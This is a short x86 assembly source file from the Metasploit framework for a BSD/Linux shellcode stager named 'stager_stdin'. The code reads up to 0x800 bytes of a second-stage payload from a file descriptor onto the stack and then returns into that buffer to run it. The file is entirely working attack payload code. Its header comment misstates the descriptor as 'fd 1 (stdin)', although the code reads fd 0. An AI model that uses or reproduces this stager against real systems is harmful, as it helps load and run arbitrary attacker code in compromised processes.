;;
; 
;        Name: stager_stdin
;   Platforms: *BSD, Linux
;     Authors: vlad902 <vlad902 [at] gmail.com>
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1656 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Read a second stage from fd 1 (stdin). 
;        
;
;;
BITS 32

section .text
global _start

_start:
	push	byte 0x03
	pop	eax
	xor	ebx, ebx
	mov	ecx, esp
	cdq
	mov	dh, 0x08

	push	edx
	push	ecx
	push	ebx
	push	ecx

	int	0x80

	ret
